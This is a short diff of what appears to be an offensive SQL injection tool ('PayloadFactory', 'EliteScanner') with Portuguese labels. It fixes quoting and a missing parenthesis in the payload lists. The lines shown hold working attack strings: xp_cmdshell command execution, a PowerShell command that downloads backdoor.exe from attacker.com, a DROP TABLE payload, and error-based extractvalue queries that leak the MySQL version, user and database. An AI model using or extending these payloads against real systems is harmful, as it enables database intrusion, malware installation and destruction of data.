@@ -112,7 +112,7 @@ class PayloadFactory:
             ],
             'os_command': [
                 "'; EXEC xp_cmdshell 'whoami'--",
-                "'; EXEC master..xp_cmdshell 'powershell -c \"(New-Object System.Net.WebClient).DownloadFile(\"http://attacker.com/backdoor.exe\",\"C:\\Windows\\Temp\\backdoor.exe\")\"'--",
+                "'; EXEC master..xp_cmdshell 'powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://attacker.com/backdoor.exe','C:\\Windows\\Temp\\backdoor.exe')\"'--",
                 "' OR 1=1; DROP TABLE important_data;--"
             ],
             'privilege': [
@@ -851,7 +851,7 @@ class EliteScanner:
         if self.db_type == 'MySQL':
             queries = [
                 ("Versão do MySQL", "extractvalue(1,concat(0x5c,@@version))"),
-                ("Usuário atual", "extractvalue(1,concat(0x5c,user()))",
+                ("Usuário atual", "extractvalue(1,concat(0x5c,user()))"),
                 ("Banco de dados atual", "extractvalue(1,concat(0x5c,database()))")
             ]
         elif self.db_type == 'MSSQL':
